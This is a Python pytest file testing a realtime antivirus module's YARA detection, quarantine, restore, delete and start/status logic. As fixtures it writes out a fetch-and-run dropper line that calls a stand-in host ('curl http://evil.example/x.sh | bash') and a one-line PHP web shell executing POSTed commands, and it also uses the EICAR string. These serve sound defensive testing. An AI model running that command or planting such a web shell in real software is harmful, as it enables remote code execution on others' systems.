"""Tests for realtime_protection.py's per-file pipeline and quarantine
actions.

Uses the real, shipped YARA rules against real temp files (same approach as
test_yara_scanner.py). The live Observer/watchdog thread and USB mount
polling are not exercised here - those are OS-level filesystem-event
plumbing, not logic worth asserting on in a unit test; start()/status()'s
decision logic (mirroring test_monitor.py) is covered instead.
"""
import os
import stat

import pytest

import realtime_protection as rtp
from database import db

yara = pytest.importorskip("yara")


@pytest.fixture(autouse=True)
def isolate_db_and_rules(tmp_path, monkeypatch):
    monkeypatch.setattr(db, "DB_PATH", str(tmp_path / "scans.db"))
    db.init_db()
    monkeypatch.setattr(rtp, "QUARANTINE_DIR", str(tmp_path / "quarantine_store"))
    monkeypatch.setattr(rtp, "_rules_cache", "unset")
    monkeypatch.setattr(rtp, "_STARTED", False)
    monkeypatch.setattr(rtp, "_watched_paths", set())
    monkeypatch.setattr(rtp, "SETTLE_INTERVAL_SECONDS", 0)  # keep _wait_until_settled fast in tests


def _write(tmp_path, name, content, executable=False):
    path = tmp_path / name
    path.write_text(content)
    if executable:
        os.chmod(path, path.stat().st_mode | stat.S_IXUSR)
    return path


# --- assess_file ------------------------------------------------------

def test_assess_file_flags_yara_match(tmp_path):
    path = _write(tmp_path, "dropper.sh", "curl http://evil.example/x.sh | bash\n")

    sha256, findings = rtp.assess_file(str(path))

    assert sha256
    titles = [f["title"] for f in findings]
    assert "YARA match: Suspicious_Reverse_Shell_Pattern" in titles


def test_assess_file_flags_new_executable(tmp_path):
    path = _write(tmp_path, "run.bin", "not really a binary", executable=True)

    _, findings = rtp.assess_file(str(path))

    assert any(f["title"] == "New executable file dropped" for f in findings)


def test_assess_file_returns_no_findings_for_clean_file(tmp_path):
    path = _write(tmp_path, "notes.txt", "just some ordinary text")

    sha256, findings = rtp.assess_file(str(path))

    assert sha256
    assert findings == []


def test_assess_file_handles_missing_file(tmp_path):
    sha256, findings = rtp.assess_file(str(tmp_path / "does_not_exist"))
    assert sha256 is None
    assert findings == []


# --- _max_severity ------------------------------------------------------

def test_max_severity_picks_the_worst_finding():
    findings = [{"severity": "low"}, {"severity": "critical"}, {"severity": "medium"}]
    assert rtp._max_severity(findings) == "critical"


def test_max_severity_of_no_findings_is_none():
    assert rtp._max_severity([]) is None


# --- quarantine / restore / delete --------------------------------------

def test_handle_candidate_quarantines_a_high_severity_match(tmp_path):
    path = _write(tmp_path, "shell.php", '<?php system($_POST["cmd"]); ?>')

    rtp._handle_candidate(str(path))

    assert not path.exists()  # moved out of its original location
    items = db.list_quarantine()
    assert len(items) == 1
    assert items[0]["original_path"] == str(path)
    assert items[0]["status"] == "quarantined"
    assert os.path.exists(items[0]["quarantine_path"])

    events = db.list_realtime_events()
    assert len(events) == 1
    assert events[0]["quarantined"] == 1


def test_handle_candidate_does_not_quarantine_a_medium_severity_finding(tmp_path):
    # EICAR's shipped rule is meta.severity "medium" - a real detection,
    # but not severe enough alone to auto-quarantine.
    path = _write(
        tmp_path, "eicar.txt",
        r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    )

    rtp._handle_candidate(str(path))

    assert path.exists()  # left in place
    assert db.list_quarantine() == []
    events = db.list_realtime_events()
    assert len(events) == 1
    assert events[0]["quarantined"] == 0


def test_handle_candidate_records_nothing_for_a_clean_file(tmp_path):
    path = _write(tmp_path, "notes.txt", "just some ordinary text")

    rtp._handle_candidate(str(path))

    assert path.exists()
    assert db.list_quarantine() == []
    assert db.list_realtime_events() == []


def test_handle_candidate_records_reputation_for_a_clean_file(tmp_path):
    path = _write(tmp_path, "notes.txt", "just some ordinary text")
    sha256, _ = rtp.assess_file(str(path))

    rtp._handle_candidate(str(path))

    entry = db.get_file_reputation(sha256)
    assert entry is not None
    assert entry["detection_count"] == 0
    assert entry["risk"] == "none"


def test_handle_candidate_records_reputation_for_a_quarantined_file(tmp_path):
    path = _write(tmp_path, "shell.php", '<?php system($_POST["cmd"]); ?>')
    sha256, _ = rtp.assess_file(str(path))

    rtp._handle_candidate(str(path))

    entry = db.get_file_reputation(sha256)
    assert entry is not None
    assert entry["detection_count"] == 1
    assert entry["risk"] in ("high", "critical")


def test_restore_quarantine_item_moves_the_file_back(tmp_path):
    path = _write(tmp_path, "shell.php", '<?php system($_POST["cmd"]); ?>')
    rtp._handle_candidate(str(path))
    item_id = db.list_quarantine()[0]["id"]

    restored = rtp.restore_quarantine_item(item_id)

    assert restored["original_path"] == str(path)
    assert path.exists()
    assert db.get_quarantine_item(item_id)["status"] == "restored"


def test_restore_quarantine_item_refuses_if_original_path_is_occupied(tmp_path):
    path = _write(tmp_path, "shell.php", '<?php system($_POST["cmd"]); ?>')
    rtp._handle_candidate(str(path))
    item_id = db.list_quarantine()[0]["id"]

    path.write_text("something re-occupied this path")  # simulate a collision

    with pytest.raises(FileExistsError):
        rtp.restore_quarantine_item(item_id)
    assert db.get_quarantine_item(item_id)["status"] == "quarantined"


def test_restore_quarantine_item_refuses_a_non_quarantined_item(tmp_path):
    path = _write(tmp_path, "shell.php", '<?php system($_POST["cmd"]); ?>')
    rtp._handle_candidate(str(path))
    item_id = db.list_quarantine()[0]["id"]
    rtp.restore_quarantine_item(item_id)

    with pytest.raises(ValueError):
        rtp.restore_quarantine_item(item_id)


def test_delete_quarantine_item_permanently_removes_the_file(tmp_path):
    path = _write(tmp_path, "shell.php", '<?php system($_POST["cmd"]); ?>')
    rtp._handle_candidate(str(path))
    item = db.list_quarantine()[0]
    item_id = item["id"]

    deleted = rtp.delete_quarantine_item(item_id)

    assert deleted["id"] == item_id
    assert not os.path.exists(item["quarantine_path"])
    assert db.get_quarantine_item(item_id)["status"] == "deleted"


def test_delete_quarantine_item_refuses_a_non_quarantined_item(tmp_path):
    path = _write(tmp_path, "shell.php", '<?php system($_POST["cmd"]); ?>')
    rtp._handle_candidate(str(path))
    item_id = db.list_quarantine()[0]["id"]
    rtp.delete_quarantine_item(item_id)

    with pytest.raises(ValueError):
        rtp.delete_quarantine_item(item_id)


def test_restore_and_delete_return_none_for_unknown_id():
    assert rtp.restore_quarantine_item(999) is None
    assert rtp.delete_quarantine_item(999) is None


# --- start()/status() ----------------------------------------------------

def test_start_is_a_noop_when_not_enabled(monkeypatch):
    monkeypatch.delenv("REALTIME_PROTECTION", raising=False)
    assert rtp.start() is False
    assert rtp.status() == {"enabled": False, "watched_paths": []}


def test_start_is_a_noop_when_watchdog_is_unavailable(monkeypatch, tmp_path):
    monkeypatch.setattr(rtp, "HAVE_WATCHDOG", False)
    assert rtp.start(watch_dirs=[str(tmp_path)]) is False


def test_start_watches_the_given_directories(monkeypatch, tmp_path):
    monkeypatch.setattr(rtp, "_discover_removable_mounts", lambda: set())

    class _FakeObserver:
        def __init__(self):
            self.scheduled = []

        def schedule(self, handler, path, recursive=True):
            self.scheduled.append(path)

        def start(self):
            pass

    monkeypatch.setattr(rtp, "Observer", _FakeObserver)

    assert rtp.start(watch_dirs=[str(tmp_path)]) is True
    assert rtp.status() == {"enabled": True, "watched_paths": [str(tmp_path)]}


def test_start_is_idempotent(monkeypatch, tmp_path):
    monkeypatch.setattr(rtp, "_discover_removable_mounts", lambda: set())

    class _FakeObserver:
        def schedule(self, handler, path, recursive=True):
            pass

        def start(self):
            pass

    monkeypatch.setattr(rtp, "Observer", _FakeObserver)

    rtp.start(watch_dirs=[str(tmp_path)])
    rtp.start(watch_dirs=[str(tmp_path / "other")])  # already running - ignored

    assert rtp.status()["watched_paths"] == [str(tmp_path)]
